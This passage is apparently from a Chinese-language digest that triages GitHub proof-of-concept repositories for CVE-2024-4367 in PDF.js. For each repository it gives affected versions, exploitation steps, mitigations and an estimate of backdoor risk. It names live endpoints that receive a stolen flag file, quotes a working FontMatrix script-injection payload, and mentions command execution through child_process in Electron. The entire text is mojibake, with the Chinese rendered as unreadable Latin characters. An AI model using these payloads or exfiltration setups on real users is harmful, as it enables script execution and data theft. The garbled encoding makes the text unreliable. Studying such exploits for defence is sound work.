3.  **ä»£ç æ‰§è¡Œï¼š**  åµŒå…¥çš„ JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œã€‚ åœ¨æä¾›çš„ POC ä»£ç ä¸­ï¼Œæ¶æ„ JavaScript ä»£ç çš„ç›®çš„æ˜¯çªƒå–ä½äº `/app/admin/flag.pdf` çš„ flag æ–‡ä»¶ï¼Œå¹¶å°†å†…å®¹å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚
     *   `exploit.pdf`: å°† flag ä»¥ DataURL æ ¼å¼å‘é€åˆ° `https://ha.requestcatcher.com/`ã€‚
     *   `poc.pdf`:  å°† flag ä»¥æ–‡ä»¶æ ¼å¼å‘é€åˆ° `https://webhook.site/134021d3-88f1-44a6-aa82-e48e33247fcc`ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æ ¹æ®å¯¹æä¾›çš„ä¸¤ä¸ª PDF æ–‡ä»¶çš„åˆ†æï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚ ä¸¤ä¸ª PDF æ–‡ä»¶ä¸­çš„ JavaScript ä»£ç éƒ½æ—¨åœ¨åˆ©ç”¨æ¼æ´çªƒå– flagï¼Œå¹¶å°† flag æ•°æ®å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨è¿›è¡Œ exfiltrationã€‚ æ²¡æœ‰å‘ç°å…¶ä»–éšè—çš„æ¶æ„è¡Œä¸ºæˆ–åé—¨ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æä¾›çš„ POC ä»£ç åˆ©ç”¨äº† PDF.js åœ¨å­—ä½“å¤„ç†ä¸­ç±»å‹æ£€æŸ¥çš„ç¼ºå¤±æ¼æ´ã€‚ æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ­¤æ¼æ´å…è®¸æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ å› æ­¤ï¼ŒPOC ä»£ç **æœ‰æ•ˆ**ã€‚

**é¡¹ç›®åœ°å€:** [BektiHandoyo/cve-pdf-host](https://github.com/BektiHandoyo/cve-pdf-host)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #4

**æ¥æº**: [CVE-2024-4367-Bhavyakcwestern_Hacking-pdf.js-vulnerability.md](../2024/CVE-2024-4367-Bhavyakcwestern_Hacking-pdf.js-vulnerability.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js, Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** PDF.js < 4.2.67, Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„é«˜å±æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡ç‰¹åˆ¶çš„ PDF æ–‡ä»¶æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ `fontMatrix` æ•°ç»„ä¸­çš„æ¼æ´ï¼Œå°†æ¶æ„ä»£ç æ³¨å…¥åˆ° PDF æ–‡ä»¶ä¸­ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ PDF.js ç‰ˆæœ¬ï¼ˆå¦‚ Firefox 126 ä¹‹å‰çš„ç‰ˆæœ¬ï¼‰æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚è¿™å¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ï¼Œæˆ–è€…å¦‚æœ PDF.js è¿è¡Œåœ¨ Electron ç­‰ç¯å¢ƒä¸­ï¼Œç”šè‡³å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„POCä»£ç ï¼ˆ`ex1.pdf` å’Œ `ex-gist.pdf`ï¼‰é€šè¿‡æ„é€ æ¶æ„çš„`fontMatrix`æ•°æ®ï¼Œè¯æ˜äº†è¯¥æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚`ex1.pdf`è§¦å‘alertï¼Œ`ex-gist.pdf`ç”šè‡³å¯ä»¥ä»è¿œç¨‹åœ°å€åŠ è½½å¹¶æ‰§è¡ŒJavaScriptï¼ŒéªŒè¯äº†æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š** è™½ç„¶è¯¥é¡¹ç›®æä¾›äº†æ¼æ´åˆ©ç”¨çš„PoCï¼Œä½†æ˜¯æ£€æŸ¥äº†ä»“åº“ä¸­çš„å…¶ä»–æ–‡ä»¶ï¼Œå¦‚`astro.config.mjs`å’Œ`package-lock.json`ç­‰é…ç½®æ–‡ä»¶ï¼Œå¹¶æœªå‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ é£é™©ä¸»è¦å­˜åœ¨äºå¦‚æœä¸‹è½½è¯¥é¡¹ç›®å¹¶åœ¨å—ä¿¡ä»»çš„ç¯å¢ƒä¸­è¿è¡Œï¼Œè¿œç¨‹åŠ è½½çš„jsæ–‡ä»¶åŒ…å«æ¶æ„payloadçš„å¯èƒ½æ€§ï¼Œå› æ­¤æ¨æµ‹æŠ•æ¯’é£é™©è¾ƒä½ï¼Œé¢„ä¼°ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„å­—ä½“çš„PDFæ–‡ä»¶ï¼Œè¯¥å­—ä½“ä¸­åŒ…å«æ¶æ„çš„`fontMatrix`æ•°ç»„ã€‚
2.  `fontMatrix`æ•°ç»„çš„å…ƒç´ åŒ…å«JavaScriptä»£ç ã€‚
3.  å½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„PDF.jsç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsä¼šè§£æå­—ä½“æ•°æ®ï¼Œç”±äºç¼ºå°‘é€‚å½“çš„ç±»å‹æ£€æŸ¥ï¼Œä¼šå°†`fontMatrix`ä¸­çš„å­—ç¬¦ä¸²ä½œä¸ºJavaScriptä»£ç æ‰§è¡Œã€‚
4.  æ¶æ„JavaScriptä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨æˆ–Electronåº”ç”¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´XSSæˆ–RCEã€‚

**é¡¹ç›®åœ°å€:** [Bhavyakcwestern/Hacking-pdf.js-vulnerability](https://github.com/Bhavyakcwestern/Hacking-pdf.js-vulnerability)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #5

**æ¥æº**: [CVE-2024-4367-LOURC0D3_CVE-2024-4367-PoC.md](../2024/CVE-2024-4367-LOURC0D3_CVE-2024-4367-PoC.md)

## CVE-2024-4367 - PDF.js ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œè¿œç¨‹ä»£ç æ‰§è¡Œç­‰ã€‚

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚PDF.js å¿…é¡»é…ç½®ä¸º isEvalSupported=true (é»˜è®¤)

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œå³å¯è§¦å‘æ¼æ´ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚`CVE-2024-4367.py` è„šæœ¬ç”¨äºç”ŸæˆåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡ä»¶ã€‚ README.md æä¾›äº†ä½¿ç”¨ç¤ºä¾‹ï¼ŒåŒ…æ‹¬æ‰§è¡Œ `alert(document.domain)` ä»¥è¯æ˜ JavaScript ä»£ç æ‰§è¡Œï¼Œä»¥åŠåˆ©ç”¨ `require('child_process').exec()` æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ï¼ˆä»…åœ¨ Electron ç¯å¢ƒä¸‹ï¼‰ã€‚

**æŠ•æ¯’é£é™©ï¼š**
PoC ä»£ç æœ¬èº«æ˜¯ä¸ºäº†åˆ©ç”¨æ¼æ´ï¼Œè€Œä¸æ˜¯æ¤å…¥åé—¨ï¼Œå…¶ç›®çš„æ˜¯ç”ŸæˆåŒ…å«æ¶æ„ JavaScript çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æ—¨åœ¨åˆ©ç”¨ç›®æ ‡åº”ç”¨ç¨‹åºï¼ˆFirefox, Thunderbirdï¼‰ä¸­çš„æ¼æ´ã€‚ è¯¥ä»“åº“ä¸­æŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œå¤§çº¦ä¸º 5%ã€‚ ä¸»è¦çš„æ½œåœ¨é£é™©å¯èƒ½æ¥è‡ªï¼š

1.  **ä¾èµ–é¡¹æŠ•æ¯’:** è„šæœ¬æœ¬èº«å¾ˆç®€å•ï¼Œä¸ä¾èµ–äºå¤–éƒ¨åº“ã€‚å› æ­¤ï¼Œä¾èµ–é¡¹æŠ•æ¯’çš„é£é™©å¾ˆä½ã€‚
2.  **ä»£ç é€»è¾‘æ··æ·†:**  ä»£ç ç›¸å¯¹æ¸…æ™°ï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„é€»è¾‘æˆ–æ··æ·†ã€‚
3.  **ä¾›åº”é“¾æ”»å‡»:** ç”±äºè¯¥ PoC æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è„šæœ¬ï¼Œå¹¶æ²¡æœ‰å¤æ‚çš„æ„å»ºæˆ–åˆ†å‘è¿‡ç¨‹ï¼Œä¾›åº”é“¾æ”»å‡»çš„é£é™©ä¹Ÿè¾ƒä½ã€‚

ç„¶è€Œï¼Œåœ¨ä½¿ç”¨ä»»ä½•ç¬¬ä¸‰æ–¹æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ—¶ï¼Œéƒ½åº”ä¿æŒè°¨æ…ï¼Œä»”ç»†å®¡æŸ¥ä»£ç ï¼Œå¹¶åœ¨éš”ç¦»ç¯å¢ƒä¸­æµ‹è¯•ï¼Œä»¥é¿å…æ½œåœ¨çš„é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´ç‚¹ï¼š** PDF.js åœ¨å¤„ç†å­—ä½“æ—¶çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±ã€‚
2.  **æ”»å‡»å‘é‡ï¼š** æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨å­—ä½“å¤„ç†ä¸­çš„æ¼æ´åµŒå…¥æ¶æ„ JavaScript ä»£ç ã€‚
3.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   ä½¿ç”¨ `CVE-2024-4367.py` è„šæœ¬ç”Ÿæˆæ¶æ„çš„ `poc.pdf` æ–‡ä»¶ï¼ŒæŒ‡å®šè¦æ‰§è¡Œçš„ JavaScript ä»£ç ä½œä¸ºå‚æ•°ã€‚
    *   è¯±å¯¼å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ Firefox, Firefox ESR æˆ– Thunderbird æ‰“å¼€è¯¥ `poc.pdf` æ–‡ä»¶ã€‚
    *   å¦‚æœ PDF.js é…ç½®å…è®¸æ‰§è¡Œ JavaScript ä»£ç ï¼ˆé»˜è®¤æƒ…å†µä¸‹ `isEvalSupported` ä¸º trueï¼‰ï¼Œåˆ™åµŒå…¥åœ¨ PDF ä¸­çš„ JavaScript ä»£ç å°†åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯èƒ½å…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼Œä»è€Œå¯¼è‡´:
    *   åœ¨æµè§ˆå™¨ä¸Šä¸‹æ–‡ä¸­çªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼Œcookiesï¼Œä¼šè¯ä»¤ç‰Œï¼‰ã€‚
    *   è¿›è¡Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚
    *   å¦‚æœ PDF.js è¿è¡Œåœ¨ Electron ç­‰ç¯å¢ƒä¸­ï¼Œå¯èƒ½æ‰§è¡Œä»»æ„æ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [LOURC0D3/CVE-2024-4367-PoC](https://github.com/LOURC0D3/CVE-2024-4367-PoC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #6

**æ¥æº**: [CVE-2024-4367-Masamuneee_CVE-2024-4367-Analysis.md](../2024/CVE-2024-4367-Masamuneee_CVE-2024-4367-Analysis.md)

## CVE-2024-4367: PDF.js ä»»æ„JavaScriptæ‰§è¡Œæ¼æ´

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´XSSæ”»å‡»ï¼Œçªƒå–ç”¨æˆ·æ•°æ®ï¼Œç”šè‡³è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºç¼ºå°‘å¯¹å­—ä½“å¤„ç†çš„ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„JavaScriptä»£ç ä¼šè¢«æ‰§è¡Œã€‚  

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**  æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚`README.md` æ–‡ä»¶æä¾›äº†æ¼æ´çš„æ¦‚è¿°ã€åˆ©ç”¨æ–¹æ³•ã€ç¼“è§£æªæ–½å’Œè¯¦ç»†åˆ†æçš„é“¾æ¥ã€‚`poc.py` è„šæœ¬ç”¨äºç”ŸæˆåŒ…å«æ¶æ„payloadçš„PDFæ–‡ä»¶ã€‚`app` ç›®å½•åŒ…å«ä¸€ä¸ªç®€å•çš„Node.jsåº”ç”¨ï¼Œç”¨äºæœ¬åœ°æµ‹è¯•ï¼Œå…è®¸ä¸Šä¼ PDFæ–‡ä»¶å¹¶é€šè¿‡`pdfjs-dist`åº“è¿›è¡Œæ¸²æŸ“ã€‚  `public/index.html` åŒ…å«å‰ç«¯ä»£ç ï¼Œç”¨äºä¸Šä¼ PDFå¹¶ä½¿ç”¨`pdf.js`è¿›è¡Œæ¸²æŸ“ã€‚  

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**  
*   æŸ¥çœ‹ `poc.pdf` ç¡®è®¤æ˜¯å¦æ¤å…¥åé—¨ï¼Œ`poc.pdf` æ˜¯æ¶æ„çš„PDFï¼Œ åˆ©ç”¨äº†å­—ä½“çš„è§£ææ¼æ´ï¼Œæ‰§è¡ŒJavascriptä»£ç ã€‚ ä½†æ˜¯ä¸å±äºåé—¨ï¼Œåªå±äºpocéªŒè¯çš„ä¸€éƒ¨åˆ†
*   æŸ¥çœ‹ `server.js` ä¸­é—´ä»¶æ˜¯å¦åŒ…å«æ¶æ„ä»£ç ï¼Œ`server.js` ä¸­é—´ä»¶å±äºæ­£å¸¸çš„expressä¸Šä¼ pdfå’Œæ‰“å¼€pdfçš„é€»è¾‘ã€‚
*   æŸ¥çœ‹ `public/index.html` ç¡®è®¤æ˜¯å¦è°ƒç”¨æ¶æ„apiï¼Œ `public/index.html`å±äºå‰ç«¯ä»£ç ï¼Œç”¨äºä¸Šä¼ pdfï¼Œå¹¶æ¸²æŸ“pdfï¼Œæ²¡æœ‰æ¶æ„apiè°ƒç”¨ã€‚
*   æŸ¥çœ‹ `poc.py` ç¡®è®¤æ˜¯å¦ç”Ÿæˆäº†æ¶æ„PDFï¼Œ`poc.py`å±äºpocéªŒè¯çš„ä¸€éƒ¨åˆ†
æ€»ä½“åˆ¤æ–­æŠ•æ¯’é£é™©æä½ï¼Œå¯èƒ½å­˜åœ¨çš„é£é™©æ˜¯ä¾èµ–åŒ…çš„ä¾›åº”é“¾æŠ•æ¯’é£é™©,è€ƒè™‘åˆ°node_modulesä½“ç§¯å·¨å¤§ï¼Œäººå·¥å®¡è®¡æˆæœ¬å¤ªé«˜ï¼Œæ‰€ä»¥è®¤ä¸ºå­˜åœ¨ 1% çš„æ½œåœ¨æŠ•æ¯’é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**
1.  æ”»å‡»è€…ä½¿ç”¨ `poc.py` è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…é€šè¿‡å„ç§æ‰‹æ®µï¼ˆä¾‹å¦‚ï¼Œç”µå­é‚®ä»¶ã€ç½‘ç«™é“¾æ¥ï¼‰è¯±ä½¿ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ã€‚
3.  å¦‚æœç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶ï¼ŒPDF.jsä¼šè§£æè¯¥æ–‡ä»¶ã€‚
4.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„çš„JavaScriptä»£ç ä¼šåœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œä»è€Œå®ç°XSSæ”»å‡»æˆ–æ½œåœ¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰§è¡Œçš„JavaScriptä»£ç çªƒå–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ã€ä¿®æ”¹ç½‘é¡µå†…å®¹ï¼Œç”šè‡³æ§åˆ¶ç”¨æˆ·çš„è®¡ç®—æœºã€‚

**é¡¹ç›®åœ°å€:** [Masamuneee/CVE-2024-4367-Analysis](https://github.com/Masamuneee/CVE-2024-4367-Analysis)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #7

**æ¥æº**: [CVE-2024-4367-MihranGIT_POC_CVE-2024-4367.md](../2024/CVE-2024-4367-MihranGIT_POC_CVE-2024-4367.md)

## CVE-2024-4367 - Firefox/Thunderbird PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** ä¸­å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶ï¼Œå¹¶ä¸”PDF.jsé…ç½®ä¸­`isEvalSupported`è®¾ç½®ä¸º`true` (é»˜è®¤å€¼)

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxã€Firefox ESR å’Œ Thunderbird ä¸­ PDF.js ç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è¯¥æ¼æ´æ˜¯ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥å¯¼è‡´çš„ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ POC ä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä¸€ä¸ªç‰¹åˆ¶çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å®šä¹‰äº†ä¸€ä¸ªè‡ªå®šä¹‰å­—ä½“ï¼ˆå¯¹è±¡ 5 0 objï¼‰ï¼Œè¯¥å­—ä½“çš„ `FontMatrix` å±æ€§åŒ…å« JavaScript ä»£ç ï¼š`/FontMatrix [0.1 0 0 0.1 0 (1\); alert\('document.location'\)]`ã€‚å½“å‘ˆç°æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œå¦‚æœ PDF.js æ²¡æœ‰æ­£ç¡®æ‰§è¡Œç±»å‹æ£€æŸ¥ï¼Œå°±ä¼šæ‰§è¡Œ `alert('document.location')`ã€‚

**æŠ•æ¯’é£é™©ï¼š**

ç»è¿‡åˆ†æï¼Œæä¾›çš„POCä»£ç ä¸­**æ²¡æœ‰**å‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`alert('document.location')` ä»…ä»…æ˜¯ä¸€ä¸ªå¼¹çª—ï¼Œç”¨äºéªŒè¯XSSæ˜¯å¦æ‰§è¡Œ. 

æŠ•æ¯’é£é™©è¯„ä¼°ï¼š0%

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **åˆ›å»ºæ¶æ„ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…ä¼šåˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒJavaScript ä»£ç åµŒå…¥åœ¨å­—ä½“å¯¹è±¡çš„ `FontMatrix` å±æ€§ä¸­ã€‚
2.  **è¯±å¯¼ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦è¯±å¯¼ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“ç‰ˆæœ¬çš„ Firefoxã€Firefox ESR æˆ– Thunderbird æ‰“å¼€è¿™ä¸ªæ¶æ„ PDF æ–‡ä»¶ã€‚è¿™å¯ä»¥é€šè¿‡ç½‘ç»œé’“é±¼æ”»å‡»ã€æ¶æ„ç½‘ç«™æˆ–å°† PDF æ–‡ä»¶åµŒå…¥åˆ°ç”µå­é‚®ä»¶ä¸­æ¥å®ç°ã€‚
3.  **JavaScript ä»£ç æ‰§è¡Œï¼š** å½“ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šå°è¯•è§£æå’Œå‘ˆç° PDF å†…å®¹ã€‚ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå­—ä½“å¯¹è±¡çš„ `FontMatrix` å±æ€§ä¸­çš„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚å¦‚æœæˆåŠŸ `alert('document.location')` ä¼šè§¦å‘ã€‚
4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯èƒ½å¯¼è‡´ä»¥ä¸‹åæœï¼š
    *   **è·¨ç«™è„šæœ¬æ”»å‡» (XSS)ï¼š** æ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œæ¶æ„ JavaScript ä»£ç ï¼Œä»è€Œçªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ Cookieã€ä¼šè¯ä»¤ç‰Œï¼‰ã€ç¯¡æ”¹ç½‘é¡µå†…å®¹æˆ–é‡å®šå‘ç”¨æˆ·åˆ°æ¶æ„ç½‘ç«™ã€‚
    *   **ä¿¡æ¯æ³„éœ²ï¼š** æ”»å‡»è€…å¯ä»¥è®¿é—®ç”¨æˆ·çš„æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿæˆ–ç½‘ç»œèµ„æºï¼Œä»è€Œæ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚

**ç¼“è§£æªæ–½ï¼š**

*   **å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ï¼š** å°† Firefoxã€Firefox ESR å’Œ Thunderbird å‡çº§åˆ°å·²ä¿®å¤æ­¤æ¼æ´çš„ç‰ˆæœ¬ (>= Firefox 126, >= Firefox ESR 115.11, >= Thunderbird 115.11)ã€‚
*   **è°¨æ…æ‰“å¼€ PDF æ–‡ä»¶ï¼š** é¿å…æ‰“å¼€æ¥è‡ªä¸å¯ä¿¡æ¥æºçš„ PDF æ–‡ä»¶ã€‚
*   **é…ç½® PDF.jsï¼š** å¦‚æœä¸éœ€è¦ JavaScript æ”¯æŒï¼Œå¯ä»¥ç¦ç”¨ PDF.js çš„ JavaScript æ‰§è¡ŒåŠŸèƒ½ (å°† `isEvalSupported` è®¾ç½®ä¸º `false`)ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼ç›¸å¯¹ç®€å•ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„ PDF æ–‡ä»¶å¹¶è¯±å¯¼ç”¨æˆ·æ‰“å¼€æ¥æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è™½ç„¶CVSSè¯„åˆ†ä¸é«˜ï¼Œä½†ç”±äºfirefox,thunderbirdç”¨æˆ·çš„å¹¿æ³›æ€§ï¼Œå…¶é€ æˆçš„å±å®³ä¸å¯å¿½è§†

**é¡¹ç›®åœ°å€:** [MihranGIT/POC_CVE-2024-4367](https://github.com/MihranGIT/POC_CVE-2024-4367)

